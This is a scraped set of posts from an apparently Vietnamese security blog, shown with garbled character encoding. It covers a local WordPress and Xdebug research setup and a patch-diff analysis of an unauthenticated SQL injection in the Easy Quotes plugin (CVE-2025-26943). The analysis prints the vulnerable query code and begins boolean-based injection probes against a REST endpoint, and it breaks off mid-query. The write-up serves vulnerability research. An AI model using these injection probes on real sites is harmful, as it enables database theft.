Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE 